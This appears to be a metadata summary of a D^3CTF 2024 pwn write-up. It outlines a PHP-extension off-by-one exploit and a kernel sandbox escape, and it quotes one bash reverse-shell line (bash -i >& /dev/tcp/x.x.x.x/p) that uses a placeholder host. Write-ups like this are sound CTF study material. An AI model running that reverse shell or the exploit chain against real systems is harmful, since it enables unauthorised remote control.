...
quality: high
full_path: D^3CTF_2024_Writeup.full.md
meta_path: D^3CTF_2024_Writeup.meta.md
images_removed: true
images_removed_count: 11
schema_version: v3.0.0-P0
summary: D^3CTF 2024 Writeup。D^3CTF 2024 PwnShell PHP 扩展 + Kernel Sandbox 两道 Pwn。。关键路径：/proc/self/maps 泄 libc base → PHP Zend off-by-one 改 node->buf → 任意地址读写劫持 _emalloc GOT。经验：PHP 扩展 off-by-one + Zend 分配器 +...
category: pwn
...
contest_type: open
wp_url: https://www.ctfiot.com/177055.html
reasoning_chain:
- 'PwnShell: include(''/proc/self/maps'') + callback() 解析 → 触发点：php 中 ob_start 反射'
- 动作：正则匹配 libc/stack/vuln.so 地址 → 假设：拿到 libc_base
- addHacker / editHacker / removeHacker 菜单 + 字符串 add → 假设：Zend 分配器 off-by-one
- 动作：editHacker(2, '...\xe0') → 观察：node->buf 越界
- 假设：任意地址读写 → 动作：劫持 _emalloc GOT 写 system
- 动作：bash -c reverse shell → 假设：user 写 mount 提权
- 'KernelSandbox (kernelland): seccomp + sandbox → 假设：protosand protobuf 反序列化 RCE'
- 动作：构造 proto payload 绕 sandbox → 观察：root 提权
failed_attempts:
- 试图直接覆盖 __free_hook → 失败：PHP Zend 走 _emalloc 不是 user malloc
- 试图 libc 任意地址写 → 失败：PHP string 越界只能改 buf 指针
key_observations:
- /proc/self/maps 是 PHP 泄漏 libc_base 经典
- PHP 扩展 off-by-one + Zend 分配器 + tcache double-free 经典利用
- ob_start('callback') 是 PHP 内置反射函数能力
- seccomp sandbox 配合 protobuf 反序列化可绕
- bash -c 'bash -i >& /dev/tcp/x.x.x.x/p 0>&1' 是 PHP RCE 标准反弹
prerequisites:
- PHP 扩展开发（Zend 分配器 + emalloc hook）
- Linux /proc/self/maps 进程内存映射
- seccomp + protobuf 反序列化
---
# D^3CTF 2024 Writeup
...
然后把后面的 base64 稍微修一下就得到了一个神秘网址：[图片已移除]，就是 flag 了。
